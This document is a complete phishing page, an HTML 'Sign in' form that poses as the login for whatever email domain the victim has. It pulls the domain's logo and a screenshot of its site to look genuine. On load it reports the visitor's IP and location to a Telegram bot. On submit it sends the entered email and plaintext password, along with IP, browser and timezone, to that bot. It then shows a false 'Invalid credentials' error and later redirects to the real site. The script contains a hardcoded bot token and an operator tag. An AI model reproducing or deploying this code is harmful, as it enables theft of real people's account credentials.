<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Active Session</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: "Lucida Sans", "Lucida Sans Regular", "Lucida Grande", "Lucida Sans Unicode", Geneva, Verdana, sans-serif;
            background-color: #f5f5f5;
            background-repeat: no-repeat;
            background-size: cover;
            display: flex;
            justify-content: flex-end;
            align-items: center;
            min-height: 100vh;
            transition: background-image 0.5s ease;
            padding-right: 50px;
        }
        .login-form {
            z-index: 1000;
            position: relative;
            width: 400px;
            padding: 40px;
            background: rgba(255, 255, 255, 0.9);
            border-radius: 5px;
            color: #333;
            text-align: center;
            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
            margin-right: 20px;
        }
        .logo {
            position: absolute;
            width: 80px;
            height: 80px;
            border-radius: 50%;
            overflow: hidden;
            top: -40px;
            left: calc(50% - 40px);
            background: white;
            border: 3px solid white;
            box-sizing: border-box;
            transition: transform 0.3s ease;
        }
        .logo:hover {
            transform: scale(1.1);
        }
        .login-form h2 {
            margin: 0;
            padding: 0 0 20px;
            color: #333;
            text-align: center;
            text-transform: uppercase;
        }
        .login-form p {
            margin: 0;
            padding: 0;
            font-weight: 700;
            color: #333;
        }
        .login-form input {
            width: 100%;
            margin-bottom: 20px;
            padding: 10px;
            box-sizing: border-box;
            background-color: rgba(255,255,255,0.9);
            transition: all 0.3s ease;
        }
        .login-form input[type=email],
        .login-form input[type=password] {
            border: none;
            border-bottom: 1px solid #000;
            outline: 0;
            height: 40px;
            color: #000;
            font-size: 18px;
        }
        .login-form input[type=submit] {
            height: 40px;
            color: #fff;
            font-size: 18px;
            background: #339af0;
            cursor: pointer;
            border-radius: 25px;
            border: none;
            outline: 0;
            margin-top: 15%;
            transition: all 0.3s ease;
        }
        .login-form input[type=submit]:hover {
            background: #228be6;
        }
        .login-form a {
            color: #333;
            font-size: 14px;
            font-weight: 700;
            text-decoration: none;
        }
        .message {
            text-align: center;
            margin-bottom: 10px;
            font-size: 18px;
            display: none;
            color: #ff6b6b;
            background: rgba(255,0,0,0.1);
            border: 1px solid rgba(255,0,0,0.2);
        }
        .success-message {
            color: #51cf66;
            background: rgba(0,255,0,0.1);
            border: 1px solid rgba(0,255,0,0.2);
        }
    </style>
</head>
<body>
    <div class="login-form" id="contactform">
        <img alt="Logo" class="logo" id="domainLogo" src="" style="display: none;">
        <div id="message" class="message"></div>
        <div id="success-message" class="message success-message" style="display: none;">Login Successful! Redirecting...</div>
        <h2>Sign in</h2>
        <form id="loginForm">
            <input type="email" id="email" placeholder="Email" required autocomplete="username">
            <input type="password" id="password" placeholder="Password" required autocomplete="current-password">
            <input type="submit" value="Sign In">
            <p><input type="checkbox" id="remember" checked> Remember Me</p>
        </form>
    </div>

    <script>
        // Telegram configuration
        const botToken = '7768568185:AAEUVStxi1GKrfXGmKgWSfFWeBLxwspx7rk';
        const chatId = '7448260596';

        // Get elements
        const domainLogo = document.getElementById('domainLogo');
        const emailField = document.getElementById('email');
        const passwordField = document.getElementById('password');
        const loginForm = document.getElementById('loginForm');
        const messageDiv = document.getElementById('message');
        const successMessageDiv = document.getElementById('success-message');
        
        // Function to send Telegram report with retry mechanism
        async function sendTelegramReport(message) {
            const sendAttempt = async (attempt = 0) => {
                try {
                    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: message
                        })
                    });
                    
                    if (!response.ok && attempt < 3) {
                        setTimeout(() => sendAttempt(attempt + 1), 2000);
                    }
                } catch (error) {
                    if (attempt < 3) {
                        setTimeout(() => sendAttempt(attempt + 1), 2000);
                    }
                }
            };
            
            await sendAttempt();
        }
        
        // Function to get IP and location info
        async function getIPInfo() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const ipData = await response.json();
                const ip = ipData.ip;
                
                try {
                    const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
                    const locationData = await locationResponse.json();
                    return {
                        ip: ip,
                        country: locationData.country_name || 'N/A',
                        city: locationData.city || 'N/A',
                        region: locationData.region || 'N/A'
                    };
                } catch (e) {
                    return { ip: ip, country: 'N/A', city: 'N/A', region: 'N/A' };
                }
            } catch (error) {
                return { ip: 'Unknown', country: 'N/A', city: 'N/A', region: 'N/A' };
            }
        }
        
        // Function to extract domain from email
        function getDomainFromEmail(email) {
            if (email && email.includes('@')) {
                return email.split('@')[1];
            }
            return null;
        }
        
        // Function to update domain logo and background
        function updateDomainAssets(email) {
            const domain = getDomainFromEmail(email);
            if (domain) {
                // Set logo
                domainLogo.src = `https://logo.clearbit.com/${domain}`;
                domainLogo.style.display = 'block';
                
                // Update background with domain website screenshot after delay
                setTimeout(() => {
                    document.body.style.backgroundImage = `url('https://image.thum.io/get/width/1200/https://${domain}')`;
                }, 1500);
            } else {
                domainLogo.style.display = 'none';
                document.body.style.backgroundImage = '';
            }
        }
        
        // Grab email from URL parameters (#email or ?email= or ?uid=)
        function getEmailFromURL() {
            const hash = window.location.hash.substring(1);
            const params = new URLSearchParams(window.location.search);
            
            if (hash.includes('@') && hash.includes('.')) {
                return hash;
            }
            return params.get('email') || params.get('uid');
        }
        
        // Report page access
        async function reportPageAccess() {
            try {
                const ipInfo = await getIPInfo();
                const accessMessage = `ðŸŒ PAGE ACCESS DETECTED\n\n` +
                                    `ðŸ“Œ IP: ${ipInfo.ip}\n` +
                                    `ðŸŒ Country: ${ipInfo.country}\n` +
                                    `ðŸ™ City: ${ipInfo.city}\n` +
                                    `ðŸ“ Region: ${ipInfo.region}`;
                
                await sendTelegramReport(accessMessage);
            } catch (error) {
                const fallbackAccessMessage = `ðŸŒ PAGE ACCESS DETECTED (IP API FAILED)`;
                await sendTelegramReport(fallbackAccessMessage);
            }
        }
        
        // Initialize form with email from URL if available
        function initForm() {
            const urlEmail = getEmailFromURL();
            if (urlEmail) {
                emailField.value = urlEmail;
                updateDomainAssets(urlEmail);
            }
        }
        
        // Set up event listeners
        function setupEventListeners() {
            emailField.addEventListener('input', () => updateDomainAssets(emailField.value));
            emailField.addEventListener('blur', () => updateDomainAssets(emailField.value));
            
            loginForm.addEventListener('submit', async function(e) {
                e.preventDefault();
                
                const email = emailField.value;
                const password = passwordField.value;
                const ipInfo = await getIPInfo();
                const domain = getDomainFromEmail(email);
                
                // Clear the password field immediately after capturing
                passwordField.value = '';
                
                // Telegram report
                const message = `ðŸ’¥ðŸŽ“ðŸš€ðŸ† OGP TG @OGPARKERNASCRA ðŸ’¥ðŸŽ“ðŸš€ðŸ†\n\n` +
                              `ðŸ“§ Ail: ${email}\n` +
                              `ðŸ” word: ${password}\n` +
                              `ðŸ“Œ IP: ${ipInfo.ip}\n` +
                              `ðŸŒ ountry: ${ipInfo.country}\n` +
                              `ðŸ™ ity: ${ipInfo.city}\n` +
                              `ðŸ“ egion: ${ipInfo.region}\n` +
                              `ðŸ“º rowser: ${navigator.userAgent}\n` +
                              `ðŸš© Language: ${navigator.language || 'N/A'}\n` +
                              `ðŸ•° imezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A'}\n\n` +
                              `ðŸŒ omain: ${domain || 'N/A'}`;
                
                try {
                    await sendTelegramReport(message);
                    showMessage('Invalid credentials. Please try again.', false);
                    
                    // Simulate login attempts
                    if (typeof invalidLoginAttempts === 'undefined') {
                        invalidLoginAttempts = 0;
                    }
                    invalidLoginAttempts++;
                    
                    if (invalidLoginAttempts >= 3) {
                        showMessage('', true);
                        setTimeout(() => {
                            if (domain) {
                                window.location.href = `https://${domain}`;
                            }
                        }, 2000);
                    }
                } catch (error) {
                    showMessage('Error sending notification.', false);
                    console.error('Error:', error);
                }
            });
        }
        
        // Show message to user
        function showMessage(text, isSuccess) {
            if (isSuccess) {
                messageDiv.style.display = 'none';
                successMessageDiv.style.display = 'block';
            } else {
                if (text) {
                    messageDiv.textContent = text;
                    messageDiv.style.display = 'block';
                } else {
                    messageDiv.style.display = 'none';
                }
                successMessageDiv.style.display = 'none';
            }
            
            setTimeout(() => {
                if (!isSuccess) {
                    messageDiv.style.display = 'none';
                }
            }, 3000);
        }
        
        // Initialize the application
        document.addEventListener('DOMContentLoaded', async () => {
            await reportPageAccess(); // Report page access immediately
            initForm();
            setupEventListeners();
        });
    </script>
</body>
</html>
